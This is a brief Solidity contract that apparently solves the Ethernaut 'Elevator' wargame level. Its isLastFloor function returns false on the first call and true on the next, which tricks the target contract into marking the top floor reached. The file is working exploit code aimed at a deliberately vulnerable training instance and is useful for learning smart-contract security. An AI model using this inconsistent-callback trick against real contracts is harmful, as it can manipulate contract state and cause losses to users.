// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint) external; 
}

contract Building {
    address instAddr = 0x794ccAB356c33BE110Bd4E29310D6b393aE04c77; //the addr of your instance
    bool public firstCall = true;
    
    function isLastFloor(uint) public returns (bool) {
        if(firstCall) { 
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
    
    function run() external {
        Elevator el = Elevator(instAddr);
        el.goTo(1);
    }
}